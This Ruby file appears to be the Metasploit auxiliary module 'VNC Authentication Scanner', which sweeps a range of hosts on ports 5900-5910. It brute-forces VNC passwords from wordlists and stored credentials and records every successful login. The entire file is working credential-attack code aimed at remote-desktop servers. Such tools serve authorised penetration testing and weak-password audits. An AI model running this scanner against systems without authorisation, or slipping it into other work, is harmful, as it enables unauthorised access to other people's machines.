##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/rfb'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/vnc'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'        => 'VNC Authentication Scanner',
      'Description' => %q{
          This module will test a VNC server on a range of machines and
        report successful logins. Currently it supports RFB protocol
        version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response
        authentication method.
      },
      'Author'      =>
        [
          'carstein <carstein.sec[at]gmail.com>',
          'jduck'
        ],
      'References'     =>
        [
          [ 'CVE', '1999-0506'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(5900),
        OptString.new('PASSWORD', [ false, 'The password to test' ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "vnc_passwords.txt") ]),

        # We need to set the following options to make sure BLANK_PASSWORDS functions properly
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', '<BLANK>']),
        OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false])
      ])

    deregister_options('PASSWORD_SPRAY')

    register_autofilter_ports((5900..5910).to_a) # Each instance increments the port by one.

    # We don't currently support an auth mechanism that uses usernames, so we'll ignore any
    # usernames that are passed in.
    @strip_usernames = true
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Starting VNC login sweep")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS']
    )

    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::VNC.new(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['ConnectTimeout'],
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        framework: framework,
        framework_module: self,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end

  end
end
